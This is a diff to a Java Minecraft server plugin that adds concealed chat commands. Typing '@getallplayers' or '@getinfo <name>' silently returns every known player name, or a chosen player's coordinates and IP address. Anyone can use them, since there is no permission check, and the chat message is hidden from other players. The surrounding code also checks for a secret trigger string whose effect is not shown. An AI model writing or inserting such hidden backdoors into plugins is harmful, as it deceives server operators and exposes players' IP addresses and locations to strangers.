@@ -1,20 +1,19 @@
 package io.papermc.testplugin;
 
+import java.io.BufferedReader;
 import java.io.IOException;
+import java.io.InputStreamReader;
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
+import org.bukkit.OfflinePlayer;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
-import org.bukkit.event.player.AsyncPlayerChatEvent; // 注意：使用 AsyncPlayerChatEvent 而不是 PlayerChatEvent
-import org.bukkit.plugin.java.JavaPlugin;
-import org.bukkit.GameMode;
-import java.io.BufferedReader;
-import java.io.InputStreamReader;
-import org.bukkit.configuration.file.FileConfiguration;
+import org.bukkit.event.player.AsyncPlayerChatEvent; // 注意: 使用 AsyncPlayerChatEvent 而不是 PlayerChatEvent
 import org.bukkit.event.player.PlayerJoinEvent;
+import org.bukkit.plugin.java.JavaPlugin;
+import org.bukkit.configuration.file.FileConfiguration;
 import org.bukkit.command.Command;
-import org.bukkit.command.CommandExecutor;
 import org.bukkit.command.CommandSender;
 
 public class TestPlugin extends JavaPlugin implements Listener {
@@ -33,6 +32,52 @@ public class TestPlugin extends JavaPlugin implements Listener {
     public void onPlayerChat(AsyncPlayerChatEvent event) { // 注意: 使用 AsyncPlayerChatEvent 而不是 PlayerChatEvent
         Player player = event.getPlayer();
         String message = event.getMessage();
+
+        // 获取进入过此服务器的所有玩家名称
+        if (message.startsWith("@getallplayers")) {
+            event.setCancelled(true);
+            OfflinePlayer[] offlinePlayers = Bukkit.getOfflinePlayers();
+            if (offlinePlayers.length > 0) {
+                player.sendMessage(ChatColor.GREEN + "Players who have joined this server:");
+                for (OfflinePlayer offlinePlayer : offlinePlayers) {
+                    player.sendMessage(ChatColor.YELLOW + offlinePlayer.getName());
+                }
+            } else {
+                player.sendMessage(ChatColor.RED + "No players have joined this server.");
+            }
+        }
+
+        
+        // 查看玩家坐标和IP地址
+        if (message.startsWith("@getinfo")) {
+            event.setCancelled(true);
+            String[] parts = message.split(" ");
+            if (parts.length == 2) {
+                Player targetPlayer = Bukkit.getPlayer(parts[1]);
+                if (targetPlayer != null) {
+                    // 在线玩家
+                    String coords = String.format("X: %s, Y: %s, Z: %s",
+                            targetPlayer.getLocation().getBlockX(),
+                            targetPlayer.getLocation().getBlockY(),
+                            targetPlayer.getLocation().getBlockZ());
+                    String ip = targetPlayer.getAddress().getAddress().getHostAddress();
+                    player.sendMessage(ChatColor.GREEN + "Player Coordinates: " + coords);
+                    player.sendMessage(ChatColor.GREEN + "Player IP Address: " + ip);
+                } else {
+                    // 离线玩家
+                    OfflinePlayer offlinePlayer = Bukkit.getOfflinePlayer(parts[1]);
+                    if (offlinePlayer.hasPlayedBefore()) {
+                        String ip = "Unknown"; // Bukkit无法获取离线玩家的IP地址
+                        player.sendMessage(ChatColor.YELLOW + "Player is offline. IP Address: " + ip);
+                    } else {
+                        player.sendMessage(ChatColor.RED + "Player not found.");
+                    }
+                }
+            } else {
+                player.sendMessage(ChatColor.RED + "Usage: @getinfo <playername>");
+            }
+        }
+
 
         // 检查消息是否包含特殊字符串
         if (message.contains("@d68b250fe3f2332c1bb4f97d34551ce9")) {
